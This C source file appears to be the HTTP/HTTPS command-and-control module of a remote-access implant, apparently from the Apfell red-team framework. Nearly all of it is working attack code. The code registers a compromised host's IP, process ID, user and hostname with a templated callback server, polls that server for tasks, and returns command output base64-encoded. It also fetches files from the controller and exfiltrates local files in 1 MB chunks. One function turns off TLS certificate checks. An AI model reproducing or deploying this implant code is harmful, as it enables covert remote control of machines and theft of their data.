

#include "default.h"
#include "errors.h"
#include "base64.h"

char* CALLBACK_HOST = "callback_host";
unsigned int CALLBACK_PORT = callback_port;
unsigned int CALLBACK_INTERVAL = callback_interval;
unsigned int CALLBACK_JITTER = 1;

int setup_connection(char * host, int port)
{
	struct hostent *server;
	struct sockaddr_in serv_addr;
	int sockfd;
	/* create the socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		//printf("ERROR opening socket");
		return ERR_OPENING_SOCKET;
	}
	int host_start = find_char(host, '/', 2) + 1;

	/* set the ip address */
	//printf("passed in to setup_connection host of: %s\n", host);
	//printf("Searching for hostname: %s\n", host + host_start);
	server = gethostbyname(host + host_start);
	if (server == NULL) {
		//printf("ERROR, no such IP");
		return ERR_NO_IP_OR_HOSTNAME;
	}
	/* fill in the structure */
	memset(&serv_addr,0,sizeof(serv_addr)); //zero it out
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	memcpy(&serv_addr.sin_addr.s_addr,server->h_addr_list[0],server->h_length);

	/* connect the socket */
	if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0){
		//printf("ERROR connecting");
		return ERR_CONNECTING;
	}
	//printf("Connected to socket\n");
	return sockfd;
}

void close_connection(int sockfd)
{
	close(sockfd);
}

int send_message(int sockfd, char* message, SSL* ssl)
{
    //printf("in send message\n");
	int total, sent, bytes;
	total = strlen(message);
	sent = 0;
	do {
	    if(ssl != NULL){
            bytes = SSL_write(ssl,message+sent,total-sent);
	    }else{
	        //printf("sending bytes\n");
	        bytes = write(sockfd,message+sent,total-sent);
	    }

		if (bytes < 0){
			//printf("ERROR writing message to socket");
			return ERR_WRITING_TO_SOCKET;
		}
		if (bytes == 0)
			break;
		sent+=bytes;
	} while (sent < total);
	return SUCCESS;
}

int read_from_sock(int sockfd, unsigned char** response, unsigned int *length, SSL* ssl)
{
	/*read the full response back from the file descriptor
	 * if the response doesn't fit in the buffer, allocate more room*/
	int total, received, bytes;
	memset(*response,0,*length);
	total = *length-1;
	received = 0;
	do {
	    if(ssl != NULL){
            bytes = SSL_read(ssl,(*response)+received,total-received);
	    }else{
	        bytes = read(sockfd,(*response)+received,total-received);
	    }
		received+=bytes;
		//printf("reading from fd, just got %d bytes, received %d, total %d\n", bytes, received, total);
		if (bytes < 0){
			//printf("ERROR reading response from file descriptor");
			return ERR_READING_FROM_FD;
		}
		if (received == total){
			if(bytes == 0){
			    //printf("returning, strlen:%d", strlen(*response));
				return SUCCESS;
			}
			// we're out of room, fix it and keep reading data
			//printf("reading from fd, received %d, total %d\n", received, total);
			*length = *length * 2;
			//printf("new length value %d\n", *length);
			*response = (unsigned char*) realloc(*response, *length); //double the size of the room we allocated
			memset((*response) + received, 0, *length-received); //set the new bytes to 0 as well
			total = *length-1;
			//printf("reading from fd, received %d, new total %d\n", received, total);
		}
		if(bytes == 0){
		    //printf("returning, strlen:%d", strlen(*response));
			return SUCCESS;
		}

	} while (received < total);
	if (received == total){
		//printf("ERROR storing complete response from file descriptor");
		//printf("received %d\n", received);
		return ERR_DATA_SIZE;
	}
	//printf("returning, strlen:%d", strlen(*response));
	return SUCCESS;
}

cJSON* get_JSON(char* URL_real, int socketfd)
{
    int use_ssl = 0;
    SSL *ssl = NULL;
    if(strstr(URL_real, "https") != NULL){
        use_ssl = 1;
        /* get all of our SSL stuff set up before creating the data to send */
        SSL_METHOD *method;
        method = SSLv23_client_method();
        //method = TLSv1_2_client_method();  /* Create new client-method instance */
        SSL_CTX *ctx = SSL_CTX_new(method);   /* Create new context */
        /* get all of our SSL stuff set up before creating the data to send */
        if(ctx != NULL){
            ssl = SSL_new(ctx);      /* create new SSL connection state */
        }else{
            //printf("SSLctx is NULL\n");
            exit(1);
        }
        if(ssl == NULL){
            //printf("Failed to do SSL_new\n");
            exit(1);
        }
        int ret = SSL_set_fd(ssl, socketfd);
        if( ret == 0){ /* attach the socket descriptor */
            //failed
            //printf("Error num from SSL_set_fd: %d\n", SSL_get_error(ssl, ret));
            exit(1);
        };
        SSL_set_connect_state(ssl);
        int host_start = find_char(CALLBACK_HOST, '/', 2) + 1;
        char* host = CALLBACK_HOST;
        SSL_set_tlsext_host_name(ssl, host + host_start);
        ret = SSL_connect(ssl);
        if ( ret != 1 ){   /* perform the connection */
            //printf("failed to do SSL-connect in get_json\n");
            //printf("Error num from SSL_connect: %d\n", SSL_get_error(ssl, ret));
            exit(1);
        }

    }
	/* makes a get request to a specified url and returns the corresponding JSON data
	 * input will be like http://IP:port/url/to/get/1 */
	char* URL = calloc(strlen(URL_real)+1,1); //JSON strings have extra set of "" around them that we need to get rid of
	strncpy(URL, URL_real+1, strlen(URL_real)-2);
	int uri_start = find_char(URL, '/', 3); //we want the uri starting with the 3rd instance of /
	int host_start = find_char(URL, '/', 2) + 1;
	char * host;
	if(strlen(HOST_HEADER) == 0){
	    host = calloc(strlen(URL) + 1, 1);
	    strncpy(host, URL + host_start, uri_start - host_start);
	}else{
        host = HOST_HEADER;
	}
	int err, response_length = 4096, json_start;
	char * response = calloc(response_length, 1);
	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET) + strlen(host) + 1, 1);
	if(message == NULL){
		//printf("Failed to allocate enough memory in get_JSON\n");
		return NULL;
	}

	sprintf(message, HTTP_GET, URL + uri_start); // message = GET /url/to/get/1 HTTP/1.1\r\n
	sprintf(message + strlen(message), JSON_HEADERS_GET, host);
	//actually send the data now
	err = send_message(socketfd, message, ssl);
	if(err != SUCCESS){
		//printf("Failed to send data to apfell\n");
		return NULL;
	}
	free(message);
	if(strlen(HOST_HEADER) == 0){free(host);}
	//get the data back
	err = read_from_sock(socketfd, &response, &response_length, ssl);
	if(err != SUCCESS){
		//printf("failed to get data back\n");
		return NULL;
	}
	//process response
	json_start = find_char(response, '{', 1);
	if(json_start == ERR_CHAR_NOT_FOUND){
		//printf("failed to find json in response in get_JSON\n");
		return NULL;
	}
	cJSON_Minify(response + json_start);
	cJSON * cJSON_response = cJSON_Parse(response + json_start);
	//printf("get_JSON response: %s\n", cJSON_PrintUnformatted(cJSON_response));
	free(response);
	free(URL);
	if(use_ssl){
	    SSL_free(ssl);
	}
	return cJSON_response;
}

cJSON* post_JSON(char* URL_real, cJSON* post_data, int socketfd)
{
    int use_ssl = 0;
    SSL *ssl = NULL;
    if(strstr(URL_real, "https") != NULL){
        //printf("URL_real: %s\n", URL_real);
        use_ssl = 1;
        SSL_METHOD *method;
        //method = SSLv23_client_method();
        method = TLSv1_2_client_method();  /* Create new client-method instance */
        SSL_CTX *ctx = SSL_CTX_new(method);   /* Create new context */
        /* get all of our SSL stuff set up before creating the data to send */
        if(ctx != NULL){
            SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
            SSL_CTX_set_verify_depth(ctx, 4);
            ssl = SSL_new(ctx);      /* create new SSL connection state */
        }else{
            //printf("SSLctx is NULL\n");
            exit(1);
        }
        if(ssl == NULL){
            //printf("Failed to do SSL_new\n");
            exit(1);
        }
        int ret = SSL_set_fd(ssl, socketfd);
        if( ret == 0){ /* attach the socket descriptor */
            //failed
            //printf("Error num from SSL_set_fd: %d\n", SSL_get_error(ssl, ret));
            exit(1);
        };
        SSL_set_connect_state(ssl);
        int host_start = find_char(CALLBACK_HOST, '/', 2) + 1;
        char* host = CALLBACK_HOST;
        SSL_set_tlsext_host_name(ssl, host + host_start);
        ret = SSL_connect(ssl);
        if ( ret != 1 ){   /* perform the connection */
            //printf("failed to do SSL_connect\n");
            //printf("post_json ssl_connect error with ret of %d\n", ret);
            //printf("Error num from SSL_connect: %d\n", SSL_get_error(ssl, ret));
            //printf("Error num from ERR_get_error(ssl): %d\n", ERR_get_error());
            exit(1);
        }
        //printf("successfully did ssl_connect\n");

    }
	/* makes a post request to a specified url and returns the corresponding JSON data
	 * input will be like http://IP:port/url/to/post and {"json":"data to post"} as a cJSON object*/
	char* URL = calloc(strlen(URL_real)+1,1); //JSON strings have an extra set of "" around them that we need to get rid of
	strncpy(URL, URL_real+1, strlen(URL_real)-2);
	int uri_start = find_char(URL, '/', 3); //we want the uri starting with the 3rd instance of /
	int host_start = find_char(URL, '/', 2) + 1;
	int err, json_start;
	char * json = cJSON_PrintUnformatted(post_data);
	int response_length = 4096;
	char * response = calloc(response_length, 1);
	char * host;
	if(strlen(HOST_HEADER) == 0){
	    host = calloc(strlen(URL) + 1, 1);
	    strncpy(host, URL + host_start, uri_start - host_start);
	}else{
        host = HOST_HEADER;
	}
	char * message = calloc(strlen(URL) + strlen(json) + strlen(HTTP_POST) + strlen(JSON_HEADERS_POST) +strlen(JSON_DATA) +strlen(host) + 1, 1);
	if(message == NULL){
		//printf("Failed to allocate enough memory to post JSON data\n");
		return NULL;
	}
	//strncpy(host, URL + host_start, uri_start - host_start);
	sprintf(message, HTTP_POST, URL + uri_start); //message = POST /url/to/post HTTP/1.1\r\n
	sprintf(message + strlen(message), JSON_HEADERS_POST, host, strlen(json));
	sprintf(message + strlen(message), JSON_DATA, json);
	free(json);
	// make sure we don't accidentally try to free a constant
	if(strlen(HOST_HEADER) == 0){free(host);}
	//free(host);
	//make the post
	err = send_message(socketfd, message, ssl);
	if(err != SUCCESS){
		//printf("Failed to send data to apfell\n");
		return NULL;
	}
	free(message);
	//get the data back
	err = read_from_sock(socketfd, &response, &response_length, ssl);
	if(err != SUCCESS){
		//printf("Failed to get data back\n");
		return NULL;
	}
	/* process response */
	json_start = find_char(response, '{', 1);
	if (json_start == ERR_CHAR_NOT_FOUND){
		//printf("failed to find json response in json_POST\n");
		return NULL;
	}
	cJSON_Minify(response + json_start);
	cJSON * cJSON_response = cJSON_Parse(response + json_start);
	//printf("post_JSON response: %s\n", cJSON_PrintUnformatted(cJSON_response));
	free(response);
	free(URL);
	if(use_ssl){
	    SSL_free(ssl);
	}
	return cJSON_response;
}

void initial_callback()
{
	int sockfd;
	pid_t pid;
	char * ip;
	/* create the socket */
	sockfd = setup_connection(CALLBACK_HOST, CALLBACK_PORT);
	if(sockfd < 0){
		//printf("Failed to connect in initial_callback\n");
		return;
	}
	InitSSL();
	ip = get_ip(sockfd);
	pid = get_pid();
	/*Make a cJSON object with our initial callback info of ip address and pid*/
	cJSON * callback_info = cJSON_CreateObject();
	cJSON_AddItemToObject(callback_info, "ip", cJSON_CreateString(ip));
	cJSON_AddItemToObject(callback_info, "pid", cJSON_CreateNumber(pid));
    char* user = get_user();
    if(user == NULL){ user = "Unknown"; }
    cJSON_AddItemToObject(callback_info, "user", cJSON_CreateString(user));
    cJSON_AddItemToObject(callback_info, "host", cJSON_CreateString(get_host()));
    cJSON_AddItemToObject(callback_info, "uuid", cJSON_CreateString(UUID));
	/* post the data and get json data back*/
	cJSON * cJSON_response = post_JSON(API_REGISTER_CALLBACK, callback_info, sockfd);
	if (cJSON_response == NULL){
		//printf("failed to do post_JSON call in initial_callback\n");
		return;
	}
	/* close the socket */
	close_connection(sockfd);
	/* process response */
	update_global_info_from_checkin(cJSON_response);
	cJSON_Delete(cJSON_response);
	free(ip);
}

void get_tasking()
{
	int sockfd;
	char * URL;
    if(global_info->callback_id == -1){
        return;
    }
	/* create the socket */
	sockfd = setup_connection(CALLBACK_HOST, CALLBACK_PORT);
	if(sockfd < 0){
		//printf("Failed to connect in get_tasking\n");
		return;
	}
	/* get the global tasking url */
    URL = (char* )calloc(strlen(API_GET_NEXT_TASK_FORMAT) + 100, 1); //add 100 for a LOT of callback id numbers
    sprintf(URL, API_GET_NEXT_TASK_FORMAT, global_info->callback_id);
	/* making the networking call to get the tasking */
	cJSON * response = get_JSON(URL, sockfd);
	//printf("%s\n", cJSON_PrintUnformatted(response));
	/* close the socket */
	close_connection(sockfd);
	if( strcmp(cJSON_GetObjectItem(response, "command")->valuestring, "none") ){
		//there is actually  tasking, we didn't get back {"command":"none"}
		add_task_to_queue(response);
	}
	cJSON_Delete(response);
    free(URL);
}

cJSON* post_response(cJSON* json)
{
    //printf("posting response...");
	int sockfd;
	char * URL;
	cJSON* response;
	/* create the socket */
	sockfd = setup_connection(CALLBACK_HOST, CALLBACK_PORT);
	if(sockfd < 0)
	{
		//printf("Failed to connect in post_response\n");
		return;
	}
	/* populate appropriate data */
    URL = (char* )calloc(strlen(API_POST_RESPONSE) + 100, 1);
    sprintf(URL, API_POST_RESPONSE, cJSON_GetObjectItem(json, "id")->valueint);
    /* need to turn json into {"response": "base64 blob of what's currently in 'data'"}*/
    cJSON * post_data = cJSON_CreateObject();
    char * data = cJSON_GetObjectItem(json, "data")->valuestring;
    char* base64_response = b64_encode((const char*)data, strlen(data));
    //printf("Base64 encoded data: %s", base64_response);
    cJSON_AddItemToObject(post_data, "response", cJSON_CreateString(base64_response));
	response = post_JSON(URL, post_data, sockfd);
	free(URL);
	cJSON_Delete(post_data);
    /* close the socket */
	close_connection(sockfd);
	return response;
}
int c2_upload(unsigned int file_id, unsigned char** file_buffer, unsigned int * file_length){
    //given a file_id, get the corresponding file from Apfell into memory and return it
    int sockfd;
	char * URL_real;
	sockfd = setup_connection(CALLBACK_HOST, CALLBACK_PORT);
	if(sockfd < 0){
		//printf("Failed to connect in get_tasking\n");
		return;
	}
	//format our URL for getting the file
    URL_real = (char* )calloc(strlen(API_GET_FILE) + 100, 1); //add 100 for a LOT of callback id numbers
    sprintf(URL_real, API_GET_FILE, file_id, global_info->callback_id);
    //now get SSL set up if needed
    int use_ssl = 0;
    SSL *ssl = NULL;
    if(strstr(URL_real, "https") != NULL){
        use_ssl = 1;
        /* get all of our SSL stuff set up before creating the data to send */
        SSL_METHOD *method;
        method = SSLv23_client_method();
        //method = TLSv1_2_client_method();  /* Create new client-method instance */
        SSL_CTX *ctx = SSL_CTX_new(method);   /* Create new context */
        /* get all of our SSL stuff set up before creating the data to send */
        if(ctx != NULL){
            ssl = SSL_new(ctx);      /* create new SSL connection state */
        }else{
            //printf("SSLctx is NULL\n");
            exit(1);
        }
        if(ssl == NULL){
            //printf("Failed to do SSL_new\n");
            exit(1);
        }
        int ret = SSL_set_fd(ssl, sockfd);
        if( ret == 0){ /* attach the socket descriptor */
            //failed
            //printf("Error num from SSL_set_fd: %d\n", SSL_get_error(ssl, ret));
            exit(1);
        };
        SSL_set_connect_state(ssl);
        int host_start = find_char(CALLBACK_HOST, '/', 2) + 1;
        char* host = CALLBACK_HOST;
        SSL_set_tlsext_host_name(ssl, host + host_start);
        ret = SSL_connect(ssl);
        if ( ret != 1 ){   /* perform the connection */
            //printf("failed to do SSL-connect in c2_upload\n");
            //printf("Error num from SSL_connect: %d\n", SSL_get_error(ssl, ret));
            exit(1);
        }

    }

	char* URL = calloc(strlen(URL_real)+1,1); //JSON strings have extra set of "" around them that we need to get rid of
	strncpy(URL, URL_real+1, strlen(URL_real)-2);
	int uri_start = find_char(URL, '/', 3); //we want the uri starting with the 3rd instance of /
	int host_start = find_char(URL, '/', 2) + 1;
	char * host;
	if(strlen(HOST_HEADER) == 0){
	    host = calloc(strlen(URL) + 1, 1);
	    strncpy(host, URL + host_start, uri_start - host_start);
	}else{
        host = HOST_HEADER;
	}

	int err;
	char * message = calloc(strlen(URL) + strlen(HTTP_GET) + strlen(JSON_HEADERS_GET) + strlen(host), 1);
	if(message == NULL){
		//printf("Failed to allocate enough memory in get_JSON\n");
		return NULL;
	}

	sprintf(message, HTTP_GET, URL + uri_start); // message = GET /url/to/get/1 HTTP/1.1\r\n
	sprintf(message + strlen(message), JSON_HEADERS_GET, host);
	//actually send the request for our file
	err = send_message(sockfd, message, ssl);
	if(err != SUCCESS){
		//printf("Failed to send data to apfell\n");
		return NULL;
	}
	free(message);
	if(strlen(HOST_HEADER) == 0){free(host);}
	//get the data back
	err = read_from_sock(sockfd, file_buffer, file_length, ssl);
	if(err != SUCCESS){
		//printf("failed to get data back\n");
		return NULL;
	}
	//process response
    int data_start = find_end_of_headers(*file_buffer);
    if(data_start > 0){
        unsigned char* final_data = calloc((*file_length)-data_start, 1);
        unsigned int final_data_length = 0;
        for(unsigned int i = data_start; i < *file_length; i++){
            if((*file_buffer)[i] > 0x2A && (*file_buffer)[i] < 0x7F){
                final_data[final_data_length] = (*file_buffer)[i];
                final_data_length++;
            }
        }
        *file_length = final_data_length;
        free(*file_buffer);
        *file_buffer = final_data;
    }
    else{
        *file_length = 0;
        free(file_buffer);
    }
}
int c2_download(FILE* fptr, unsigned int size, unsigned int task_id){
    // chunk size will be 1 MB
    //determine total chunks and send in metadata initial response
    unsigned int chunk_size = 1000000;
    unsigned int total_chunks = (size / chunk_size) + 1; // add 1 to round to at least 1 chunk due to integer math
    cJSON* r = cJSON_CreateObject();
    cJSON_AddNumberToObject(r,"task", task_id);
    cJSON_AddNumberToObject(r,"total_chunks", total_chunks);
    cJSON * response = cJSON_CreateObject();
    cJSON_AddNumberToObject(response,"id", task_id);
    unsigned char * json_data = cJSON_PrintUnformatted(r);
    unsigned char * encoded_data;
    cJSON_Delete(r);
    cJSON_AddStringToObject(response, "data", json_data);
    cJSON* output = post_response(response);
    free(json_data);
    cJSON_Delete(response);
    //output should have the file_id we need to use in subsequent requests
    unsigned int file_id = cJSON_GetObjectItem(output, "file_id")->valueint;
    cJSON_Delete(output);
    if(file_id > 0){
        int i;
        for(i = 0; i < total_chunks; i++){
            unsigned char * buff = malloc(chunk_size);
            if(buff == NULL){
                //printf("buff didn't actually malloc\n");
                return -1;
            }
            //printf("just malloc-ed\n");
            if(fptr == NULL){
                //printf("fptr is null\n");
                return -1;
            }
            unsigned int bytes = fread(buff, 1, chunk_size, fptr);
            r = cJSON_CreateObject();
            cJSON_AddNumberToObject(r,"chunk_num", i+1);
            cJSON_AddNumberToObject(r,"task", task_id);
            cJSON_AddNumberToObject(r,"file_id", file_id);
            encoded_data = b64_encode(buff, bytes);
            cJSON_AddStringToObject(r, "chunk_data", encoded_data);
            response = cJSON_CreateObject();
            cJSON_AddNumberToObject(response,"id", task_id);
            json_data = cJSON_PrintUnformatted(r);
            cJSON_AddStringToObject(response, "data", json_data);
            output = post_response(response);
            cJSON_Delete(output);
            cJSON_Delete(r);
            cJSON_Delete(response);
            free(buff);
            free(encoded_data);
        }
    }else{
        return -1;
    }
    //send all of the needed chunks
    //return
    return SUCCESS;
}
void InitSSL(void)
{
    OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
    SSL_load_error_strings();   /* Bring in and register error messages */
    ERR_load_crypto_strings();
    SSL_library_init();

}